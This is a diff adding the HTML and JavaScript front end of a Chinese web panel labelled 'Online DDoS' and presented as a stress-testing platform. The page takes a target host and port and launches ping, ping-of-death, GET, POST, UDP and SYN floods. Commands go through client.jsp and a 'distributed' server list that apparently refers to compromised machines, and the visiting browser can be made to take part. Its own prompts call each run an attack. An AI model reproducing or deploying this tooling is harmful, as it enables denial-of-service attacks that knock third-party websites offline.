@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" type="text/css">
+  <link rel="stylesheet" href="theme.css" type="text/css"> </head>
+
+<body>
+  <nav class="navbar navbar-expand-md bg-dark navbar-dark p-0">
+    <div class="container">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbar3SupportedContent">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse text-center justify-content-center" id="navbar3SupportedContent">
+        <ul class="navbar-nav">
+          <li class="nav-item py-0">
+            <a class="nav-link" href="#">
+              <h1 class="my-0">在线网站压力测试平台-Online DDoS</h1>
+            </a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <div class="p-3 h-75">
+    <div class="container">
+      <div class="row">
+        <div class="col-md-4">
+          <div class="card">
+            <div class="card-header">基础设置</div>
+            <div class="card-body">
+              <div class="form-group">
+                <label>目标网址：</label>
+                <input type="email" id="MuBiaoWangZhi" class="form-control" placeholder="xxx.xxx.xxx(请不要输入http://)"> </div>
+              <div class="form-group">
+                <label>目标端口：</label>
+                <input type="email" id="MuBiaoDuanKou" class="form-control" placeholder="默认80" value="80"> </div>
+              <div class="form-group">
+                <label>HTTP协议头：</label>
+                <form class="form-inline">
+                  <div class="input-group">
+                    <input type="email" id="show_HTTP" class="form-control" placeholder="" readonly="">
+                    <div class="input-group-append">
+                      <button class="btn btn-primary btn-block" type="button" data-toggle="modal" data-target="#XieYiTou_Modal">自定义头</button>
+                    </div>
+                  </div>
+                </form>
+              </div>
+              <div class="checkbox">
+                <label>
+                  <input type="checkbox" id="IsBenDi" value="">是否让当前浏览器参与(会消耗本地资源)</label>
+              </div>
+              <div class="checkbox">
+                  <label>
+                    <input type="checkbox" id="IsFenBu" value="">是否启动分布式压力测试</label>
+                </div>
+            </div>
+          </div>
+          <br>
+          <div class="card">
+            <div class="card-header">服务端列表</div>
+            <div class="card-body px-0 py-0">
+              <iframe src="rouji_list.jsp" height="520" width="100%" frameborder="0"> </iframe>
+            </div>
+          </div>
+        </div>
+        <div class="col-md-8">
+          <div class="card">
+            <div class="card-header">命令面板(测试次数为每个客户端的执行次数)</div>
+            <div class="card-body">
+              <div class="row">
+                <div class="col-md-6">
+                  <div class="card">
+                    <div class="card-header">Ping压力测试</div>
+                    <div class="card-body">
+                      <div class="form-group">
+                        <label>测试次数：</label>
+                        <input type="email" id="Ping_CiShu" class="form-control" placeholder="请输入测试次数"> </div>
+                      <div class="checkbox">
+                        <label>
+                          <input type="checkbox" id="Is_SiWangPing" value="">死亡之Ping(可能大量占用服务器资源)</label>
+                      </div>
+                      <a class="btn btn-primary btn-block my-2" onclick="SendData('ping')">开始测试</a>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-md-6">
+                  <div class="card">
+                    <div class="card-header">GET参数压力测试</div>
+                    <div class="card-body">
+                      <div class="form-group">
+                        <label>测试次数：</label>
+                        <input type="email" id="GET_CiShu" class="form-control" placeholder="请输入测试次数"> </div>
+                      <div class="row">
+                        <div class="col-md-8">
+                          <input type="email" class="form-control" id="show_GET" placeholder="GET参数" readonly=""> </div>
+                        <div class="col-md-4">
+                          <a class="btn btn-primary btn-block" data-toggle="modal" data-target="#GET_Modal">自定义</a>
+                        </div>
+                      </div>
+                      <a class="btn btn-primary btn-block my-1" onclick="SendData('get')">开始测试</a>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <br>
+              <div class="row">
+                <div class="col-md-6">
+                  <div class="card">
+                    <div class="card-header">POST参数压力测试</div>
+                    <div class="card-body">
+                      <div class="form-group">
+                        <label>测试次数：</label>
+                        <input type="email" id="POST_CiShu" class="form-control" placeholder="请输入测试次数"> </div>
+                      <div class="row">
+                        <div class="col-md-8">
+                          <input type="email" class="form-control" id="show_POST" placeholder="POST参数" readonly=""> </div>
+                        <div class="col-md-4">
+                          <a class="btn btn-primary btn-block" data-toggle="modal" data-target="#POST_Modal">自定义</a>
+                        </div>
+                      </div>
+                      <br>
+                      <br>
+                      <a class="btn btn-primary btn-block my-0" onclick="SendData('post')">开始测试</a>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-md-6">
+                  <div class="card">
+                    <div class="card-header">UDP洪水(本地浏览器不参与)</div>
+                    <div class="card-body">
+                      <div class="form-group">
+                        <label>测试次数：</label>
+                        <input type="email" class="form-control" id="UDP_CiShu" placeholder="请输入测试次数"> </div>
+                      <div class="form-group">
+                        <label>线程数：</label>
+                        <input type="email" class="form-control" id="UDP_XianChengShu" placeholder="请输入线程数"> </div>
+                      <a class="btn btn-primary btn-block" onclick="SendData('udp')">开始测试</a>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <br>
+              <div class="row">
+                <div class="col-md-6">
+                  <div class="card">
+                    <div class="card-header">SYN洪水(本地浏览器不参与)</div>
+                    <div class="card-body">
+                      <div class="form-group">
+                        <label>测试次数：</label>
+                        <input type="email" class="form-control" id="SYN_CiShu" placeholder="请输入测试次数"> </div>
+                      <div class="form-group">
+                        <label>线程数：</label>
+                        <input type="email" class="form-control" id="SYN_XianChengShu" placeholder="请输入线程数"> </div>
+                      <a class="btn btn-primary btn-block my-0" onclick="SendData('syn')">开始测试</a>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-md-6">
+                  <div class="card">
+                    <div class="card-header">日志</div>
+                    <div class="card-body px-0 py-0">
+                      <textarea class="form-control py-0 px-0" rows="14" width="100%" style="font-size:5px" id="rizhi" readonly=""></textarea>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+  <!-- 自定义协议头模态框 -->
+  <div class="modal fade" id="XieYiTou_Modal">
+    <div class="modal-dialog">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h4 class="modal-title">自定义HTTP协议头</h4>
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+        </div>
+        <div class="modal-body">
+          <textarea class="form-control" rows="15" width="100%" id="HTTP_XieYiTou"></textarea>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-secondary" data-dismiss="modal" onclick="TongBu_ZiDingYi(1)">保存并关闭</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- 自定义GET模态框 -->
+  <div class="modal fade" id="GET_Modal">
+    <div class="modal-dialog">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h4 class="modal-title">自定义GET参数(形如a=1,每行一个)</h4>
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+        </div>
+        <div class="modal-body">
+          <textarea class="form-control" rows="15" width="100%" id="GET_CanShu"></textarea>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-secondary" data-dismiss="modal" onclick="TongBu_ZiDingYi(2)">保存并关闭</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- 自定义POST模态框 -->
+  <div class="modal fade" id="POST_Modal">
+    <div class="modal-dialog">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h4 class="modal-title">自定义POST参数(形如a=1,每行一个)</h4>
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+        </div>
+        <div class="modal-body">
+          <textarea class="form-control" rows="15" width="100%" id="POST_CanShu"></textarea>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-secondary" data-dismiss="modal" onclick="TongBu_ZiDingYi(3)">保存并关闭</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+<script src="js/lib.js"></script>
+<script>
+window.onload = function(){
+  InitData();
+}
+function InitData()
+{
+	document.getElementById("HTTP_XieYiTou").value="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint,\n application/msword, application/x-silverlight, application/x-shockwave-flash, \n Referer: <a href=\"http://www.google.cn/\">http://www.google.cn/</a>  \n Accept-Language: zh-cn  \n Accept-Encoding: gzip, deflate  \n User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; TheWorld)  \n Host: <a href=\"http://www.google.cn\">www.google.cn</a>  \n Connection: Keep-Alive   \n ";
+    document.getElementById("show_HTTP").value= "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint,\n application/msword, application/x-silverlight, application/x-shockwave-flash, \n Referer: <a href=\"http://www.google.cn/\">http://www.google.cn/</a>  \n Accept-Language: zh-cn  \n Accept-Encoding: gzip, deflate  \n User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; TheWorld)  \n Host: <a href=\"http://www.google.cn\">www.google.cn</a>  \n Connection: Keep-Alive   \n ";
+	PrintLog("数据初始化成功！");
+}
+function CheckHTTP()
+{
+  var wangzhi = document.getElementById("MuBiaoWangZhi").value;
+  var xieyitou = document.getElementById("HTTP_XieYiTou").value;
+  if(wangzhi == "")
+  {
+    alert("目标网址不能为空！");
+    return false;
+  }
+  if(xieyitou == "")
+  {
+    alert("HTTP协议头不能为空！");
+    return false;
+  }
+  return true;
+}
+function CheckPing()
+{
+  var pingcishu = document.getElementById("Ping_CiShu").value;
+  var issiwangping = document.getElementById("Is_SiWangPing").checked;
+  if(!issiwangping)
+  {
+    if(pingcishu == "")
+    {
+      alert("请输入攻击次数！");
+      return false;
+    }
+    for(var i=0;i<pingcishu;i++)
+    {
+      ping(document.getElementById("MuBiaoWangZhi").value);
+    }
+  }
+  return true;
+}
+function CheckGET()
+{
+  var getcishu = document.getElementById("GET_CiShu").value;
+  if(getcishu == "")
+  {
+    alert("请输入攻击次数！");
+    return false;
+  }
+  return true;
+}
+function CheckPOST()
+{
+  var getcishu = document.getElementById("POST_CiShu").value;
+  if(getcishu == "")
+  {
+    alert("请输入攻击次数！");
+    return false;
+  }
+  return true;
+}
+function CheckUDP()
+{
+  var getcishu = document.getElementById("UDP_CiShu").value;
+  if(getcishu == "")
+  {
+    alert("请输入攻击次数！");
+    return false;
+  }
+  return true;
+}
+function CheckSYN()
+{
+  var getcishu = document.getElementById("SYN_CiShu").value;
+  if(getcishu == "")
+  {
+    alert("请输入攻击次数！");
+    return false;
+  }
+  return true;
+}
+function TongBu_ZiDingYi(sign)
+{
+  if(sign == 1)
+  {
+    document.getElementById("show_HTTP").value = document.getElementById("HTTP_XieYiTou").value;
+    PrintLog("更新HTTP协议头成功！");
+  }
+  else if(sign == 2)
+  {
+    var yuanshi = document.getElementById("GET_CanShu").value.split('\n');
+    var bak = document.getElementById("show_GET").value;
+    var result = "";
+    for(var i=0;i<yuanshi.length;i++)
+    {
+      if(result=="")
+      {
+        result = yuanshi[i];
+      }
+      else
+      {
+        if(yuanshi[i]!="")
+        {
+          result += "&";
+          result += yuanshi[i];
+        }
+      }
+    }
+    if(bak != result)
+    {
+      document.getElementById("show_GET").value = result;
+      PrintLog("更新GET参数成功！"+result);
+    }
+  }
+  else if(sign == 3)
+  {
+    var yuanshi = document.getElementById("POST_CanShu").value.split('\n');
+    var bak = document.getElementById("show_POST").value;
+    var result = "";
+    for(var i=0;i<yuanshi.length;i++)
+    {
+      if(result=="")
+      {
+        result = yuanshi[i];
+      }
+      else
+      {
+        if(yuanshi[i]!="")
+        {
+          result += "&";
+          result += yuanshi[i];
+        }
+      }
+    }
+    if(bak != result)
+    {
+      document.getElementById("show_POST").value = result;
+      PrintLog("更新POST参数成功！"+result);
+    }
+  }
+}
+
+function PrintLog(text)
+{
+  var yuanshi = document.getElementById("rizhi");
+  yuanshi.value = yuanshi.value + text + "\n";
+}
+function trimStr(str) {
+    return str.replace(/(^\s*)|(\s*$)/g, "");
+}
+function SendData(sign)
+{
+	if(!CheckHTTP())
+	{
+		return;
+	}
+	var wangzhi = document.getElementById("MuBiaoWangZhi").value;
+	var port = document.getElementById('MuBiaoDuanKou').value;
+	var xieyitou = document.getElementById("HTTP_XieYiTou").value;
+	if(sign == "ping")
+	{
+		if(CheckPing())
+		{
+			var count=document.getElementById('Ping_CiShu').value;
+			var issiwang = document.getElementById('Is_SiWangPing').checked;
+			if(issiwang)
+			{
+				Send("sign=ping&isDeath=1&target="+wangzhi+"&port="+port)
+			}
+			else
+			{
+				Send("sign=ping&count="+count+"&target="+wangzhi+"&port="+port)
+			}
+			PrintLog("Starting Ping Test!");
+		}
+	}
+	else if(sign == "get")
+	{
+		if(CheckGET())
+		{
+			var count=document.getElementById('GET_CiShu').value;
+			var param = escape("OnlineDDoS=OnlineDDoS&"+document.getElementById('GET_CanShu').value);
+			Send("sign=get&count="+count+"&target="+wangzhi+"&port="+port+"&paremeter="+param);
+			PrintLog("Starting GET Test!");
+		}
+	}
+	else if(sign == "post")
+	{
+		if(CheckPOST())
+		{
+			var count=document.getElementById('POST_CiShu').value;
+			var param = escape("OnlineDDoS=OnlineDDoS&"+document.getElementById('POST_CanShu').value);
+			Send("sign=post&count="+count+"&target="+wangzhi+"&port="+port+"&paremeter="+param);
+			PrintLog("Starting POST Test!");
+		}
+	}
+	else if(sign == "udp")
+	{
+		if(CheckUDP())
+		{
+			var count=document.getElementById('UDP_CiShu').value;
+			Send("sign=udp&count="+count+"&target="+wangzhi+"&port="+port);
+			PrintLog("Starting UDP Test!");
+		}
+	}
+	else if(sign == "syn")
+	{
+		if(CheckSYN())
+		{
+			var count=document.getElementById('SYN_CiShu').value;
+			Send("sign=syn&count="+count+"&target="+wangzhi+"&port="+port);
+			PrintLog("Starting SYN Test!");
+		}
+	}
+}
+function Send(param)
+{
+FenBu(param);
+var xmlhttp = new XMLHttpRequest();
+xmlhttp.onreadystatechange = function () {
+	if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
+		var mes = trimStr(xmlhttp.responseText);
+		PrintLog(mes);
+	}
+}
+var data = param;
+xmlhttp.open("POST", "../../lib/client.jsp", true);
+xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+xmlhttp.send(data);
+}
+function FenBu(param)
+{
+	if(document.getElementById('IsFenBu').checked)
+	{
+		alert("23");
+		var xmlhttp = new XMLHttpRequest();
+		xmlhttp.onreadystatechange = function () {
+			if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
+				var mes = trimStr(xmlhttp.responseText);
+				PrintLog(mes);
+			}
+		}
+		var data = "paremeter="+escape(param);
+		xmlhttp.open("POST", "../../lib/server.jsp", true);
+		xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+		xmlhttp.send(data);
+	}
+}
+</script>
+</html>
